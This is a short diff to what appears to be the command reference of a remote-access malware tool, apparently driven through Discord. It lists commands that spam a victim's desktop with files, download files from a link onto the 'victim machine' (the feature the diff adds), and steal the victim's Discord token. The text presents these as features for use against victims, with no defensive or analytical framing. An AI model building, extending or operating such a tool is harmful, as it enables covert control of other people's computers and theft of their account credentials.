@@ -53,11 +53,15 @@ no parameters
 
 
 desktopbomb - spams the desktop with x (where x is a number) text file
+
 desktopbomb 4 (will spam the desktop with 4 text file)
 
 
 
-download - work in progress
+download - download a file on victim machine, if the complete path is not specified the file will be downloaded in downloads folder
+
+download link file_path.extension
+
 
 
 dstoken - steal the discord token of the victim
